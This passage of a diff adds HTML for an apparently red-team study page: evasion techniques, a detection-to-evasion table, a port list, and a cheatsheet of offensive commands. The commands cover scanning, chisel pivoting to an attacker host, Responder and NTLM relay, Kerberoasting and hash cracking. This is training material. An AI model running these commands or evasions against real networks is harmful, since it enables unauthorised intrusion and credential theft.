+<p>Ports 80, 443, and 53 are commonly allowed outbound because business operations depend on web and DNS traffic.</p>
+<p>Deep packet inspection can terminate TLS and inspect payloads. Red teamers respond with domain fronting, trusted certificates, JA3 impersonation, and traffic shaping.</p>
+<p>NAT hides internal hosts behind one public IP. Reverse shells are preferred because inbound bind shells fail behind NAT.</p>
+<table class="dtable"><tr><th>Detection</th><th>Counter-Technique</th></tr>
+<tr><td>Nmap timing patterns</td><td>Slow scans and jitter</td></tr>
+<tr><td>Tool User-Agents</td><td>Impersonate browsers</td></tr>
+<tr><td>C2 JA3 hashes</td><td>Malleable TLS profiles</td></tr>
+<tr><td>Large DNS labels</td><td>Chunked encoding</td></tr>
+<tr><td>Port scan rate</td><td>Distributed scanning</td></tr></table>
+<div class="mm"><strong>◈ Mental Model</strong>Modern C2 succeeds by looking indistinguishable from ordinary outbound business traffic.</div>
+<div class="cl-item"><div class="check"></div><span>Explained stateful inspection</span></div>
+<div class="cl-item"><div class="check"></div><span>Configured reverse shell</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained NAT constraints</span></div>
+<div class="cl-item"><div class="check"></div><span>Mapped IDS detections to evasions</span></div>
+</div></div>
+
+<h2 class="section-title" id="ports">Section 12 — Port Reference</h2>
+<div class="ports-grid">
+<div class="port-card critical"><h4>21</h4><p>FTP</p></div>
+<div class="port-card critical"><h4>22</h4><p>SSH</p></div>
+<div class="port-card"><h4>23</h4><p>Telnet</p></div>
+<div class="port-card"><h4>25</h4><p>SMTP</p></div>
+<div class="port-card"><h4>53</h4><p>DNS</p></div>
+<div class="port-card"><h4>67</h4><p>DHCP</p></div>
+<div class="port-card"><h4>69</h4><p>TFTP</p></div>
+<div class="port-card critical"><h4>80</h4><p>HTTP</p></div>
+<div class="port-card critical"><h4>88</h4><p>Kerberos</p></div>
+<div class="port-card"><h4>110</h4><p>POP3</p></div>
+<div class="port-card"><h4>111</h4><p>RPCbind</p></div>
+<div class="port-card critical"><h4>135</h4><p>MSRPC</p></div>
+<div class="port-card critical"><h4>139</h4><p>NetBIOS</p></div>
+<div class="port-card"><h4>143</h4><p>IMAP</p></div>
+<div class="port-card critical"><h4>389</h4><p>LDAP</p></div>
+<div class="port-card critical"><h4>443</h4><p>HTTPS</p></div>
+<div class="port-card critical"><h4>445</h4><p>SMB</p></div>
+<div class="port-card"><h4>464</h4><p>Kerberos Password</p></div>
+<div class="port-card"><h4>514</h4><p>Syslog</p></div>
+<div class="port-card"><h4>587</h4><p>SMTP TLS</p></div>
+<div class="port-card critical"><h4>636</h4><p>LDAPS</p></div>
+<div class="port-card"><h4>993</h4><p>IMAPS</p></div>
+<div class="port-card"><h4>995</h4><p>POP3S</p></div>
+<div class="port-card"><h4>1080</h4><p>SOCKS</p></div>
+<div class="port-card critical"><h4>1433</h4><p>MSSQL</p></div>
+<div class="port-card"><h4>1521</h4><p>Oracle</p></div>
+<div class="port-card"><h4>2049</h4><p>NFS</p></div>
+<div class="port-card"><h4>3306</h4><p>MySQL</p></div>
+<div class="port-card critical"><h4>3389</h4><p>RDP</p></div>
+<div class="port-card"><h4>5432</h4><p>PostgreSQL</p></div>
+<div class="port-card critical"><h4>5985</h4><p>WinRM HTTP</p></div>
+<div class="port-card critical"><h4>5986</h4><p>WinRM HTTPS</p></div>
+</div>
+
+<h2 class="section-title" id="cheats">Section 13 — Command Cheatsheet</h2>
+<div class="grid2">
+<div>
+<div class="cb"><span class="cmt"># Initial Enumeration</span>
+<span class="cmd">nmap</span> -sn 10.10.10.0/24
+<span class="cmd">nmap</span> -p- -T4 target
+<span class="cmd">ffuf</span> -u https://target/FUZZ -w words.txt
+<span class="cmd">subfinder</span> -d domain.com
+<span class="cmd">amass</span> enum -d domain.com
+<span class="cmd">dig</span> AXFR @ns1.domain.com domain.com</div>
+<div class="cb"><span class="cmt"># Pivoting</span>
+<span class="cmd">ssh</span> -D 1080 user@pivot
+<span class="cmd">chisel</span> server --reverse -p 8000
+<span class="cmd">chisel</span> client attacker:8000 R:socks
+<span class="cmd">ssh</span> -L 8080:internal:80 user@pivot</div>
+</div>
+<div>
+<div class="cb"><span class="cmt"># Post-Compromise Linux</span>
+<span class="cmd">id</span>
+<span class="cmd">ip addr</span>
+<span class="cmd">ip route</span>
+<span class="cmd">arp -a</span>
+<span class="cmd">ss -tlnp</span>
+
+<span class="cmt"># Post-Compromise Windows</span>
+<span class="cmd">whoami /all</span>
+<span class="cmd">ipconfig /all</span>
+<span class="cmd">route print</span>
+<span class="cmd">netstat -ano</span>
+<span class="cmd">net user</span></div>
+<div class="cb"><span class="cmt"># SMB / AD Enumeration</span>
+<span class="cmd">crackmapexec</span> smb 10.10.10.0/24
+<span class="cmd">Responder</span> -I eth0 -wrf
+<span class="cmd">ntlmrelayx.py</span> -tf targets.txt
+<span class="cmd">GetUserSPNs.py</span> domain/user:pass -dc-ip DC
+<span class="cmd">hashcat</span> -m 13100 hashes.txt rockyou.txt</div>
+</div>
+</div>
+
+<h2 class="section-title" id="mental">Section 14 — Mental Models</h2>
+<div class="models">
+<div class="model-card"><h4>OSI Model</h4><p>Every packet is a stack of wrappers inspected by different devices.</p></div>
+<div class="model-card"><h4>Subnetting</h4><p>Subnetting decides whether traffic stays local or requires a router.</p></div>
+<div class="model-card"><h4>TCP Handshake</h4><p>TCP connections begin with trust establishment through synchronized sequence numbers.</p></div>
+<div class="model-card"><h4>DNS C2</h4><p>DNS can smuggle data because almost every network trusts it.</p></div>
+<div class="model-card"><h4>ARP Poisoning</h4><p>LAN devices trust whoever answers ARP first.</p></div>
+<div class="model-card"><h4>Responder</h4><p>Windows fallback name resolution leaks credentials when DNS fails.</p></div>
+<div class="model-card"><h4>TLS / JA3</h4><p>Encrypted traffic still exposes behavioral fingerprints.</p></div>
+<div class="model-card"><h4>NTLM PtH</h4><p>The NT hash itself functions as a reusable credential.</p></div>
+<div class="model-card"><h4>Pivoting</h4><p>A compromised host can become a router into hidden environments.</p></div>
+<div class="model-card"><h4>Firewall Beaconing</h4><p>Outbound traffic is trusted more than inbound traffic.</p></div>
+</div>
+</main>
+<script>
+const modules=document.querySelectorAll('.module');
+modules.forEach(m=>{
+m.querySelector('.module-header').addEventListener('click',()=>m.classList.toggle('open'));
+});
+
+const items=document.querySelectorAll('.cl-item');
+items.forEach((item,i)=>{
+const key='rtm-task-'+i;
+if(localStorage.getItem(key)==='1') item.classList.add('done');
+item.querySelector('.check').innerHTML=item.classList.contains('done')?'✓':'';
+item.addEventListener('click',()=>{
+item.classList.toggle('done');
+const done=item.classList.contains('done');
+item.querySelector('.check').innerHTML=done?'✓':'';
+localStorage.setItem(key,done?'1':'0');
+updateProgress();
+});
+});
+
+function updateProgress(){
+const total=items.length;
+const done=document.querySelectorAll('.cl-item.done').length;
+document.getElementById('progressText').textContent=`${done} / ${total} tasks completed`;
+document.getElementById('progressFill').style.width=(done/total*100)+'%';
+const navLinks=document.querySelectorAll('.nav a');
+modules.forEach((m,i)=>{
+const checks=m.querySelectorAll('.cl-item');
+const complete=m.querySelectorAll('.cl-item.done').length;
+if(checks.length && complete===checks.length){
+navLinks[i+2]?.querySelector('.dot').classList.add('done');
+}else{
+navLinks[i+2]?.querySelector('.dot').classList.remove('done');
+}
+});
+}
+updateProgress();
+</script>
+</body>
+</html>
+
